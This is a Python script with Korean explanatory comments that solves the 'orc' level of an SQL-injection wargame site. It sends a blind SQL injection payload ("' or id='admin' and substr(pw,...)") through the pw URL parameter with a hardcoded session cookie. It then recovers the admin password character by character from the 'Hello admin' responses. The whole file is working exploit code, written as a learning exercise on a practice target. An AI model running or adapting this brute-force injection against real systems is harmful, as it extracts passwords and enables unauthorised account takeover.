import urllib.request # python3의 내장 라이브러리인 urllib의 request 모듈을 사용할 수 있도록 이 코드에 불러온다.
from urllib.parse import quote # python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.

key = "" # pw값을 저장할 문자열 변수
for i in range(1, 9): # 8자리임을 알아냈으므로 i에는 1부터 8까지 들어가도록 반복문을 구성
    for j in range(32, 127): # ASCII Code에서 화면에 출력 가능한 문자의 10진수 범위는 32부터 126까지이다.
        url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=" # 공격할 URL에서 변하지 않는 부분이다.
        data = "' or id='admin' and substr(pw, 1, {})='{}'#".format(
            str(i), key + chr(j)) # 반복문을 진행하며 계속 다른 문자가 들어갈 문자열이다.
        print(data) # 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.
        data = quote(data) # URL Encoding을 해 준다.
        re = urllib.request.Request(url + data) # 1행에서 불러온 request 모듈의 Request 클래스를 통해 Request 객체를 만든다.

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36") # re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다. 
        re.add_header(
            "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
        ) # re 객체의 header에 Cookie로 본인이 로그인한 클라이언트의 PHPSESSID를 추가한다. 이것이 없으면 페이지가 login_chk()에 걸려 그 다음 처리를 하지 않고 <script>location.href='./';</script> 만 응답한다.

        req = urllib.request.urlopen(re) # 객체를 이용해 요청을 보낸다.

        if str(req.read()).find("Hello admin") != -1: # 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.
            key += chr(j).lower() # key 변수 뒤에 ASCII Code로 j값에 해당하는 문자를 붙인다.
            print(key) # key를 출력한다.
            break # i번째 위치의 문자를 찾았으므로 반복문을 탈출한다.
print(key) # 반복문이 끝나면 최종적으로 찾아낸 8글자 key를 출력한다.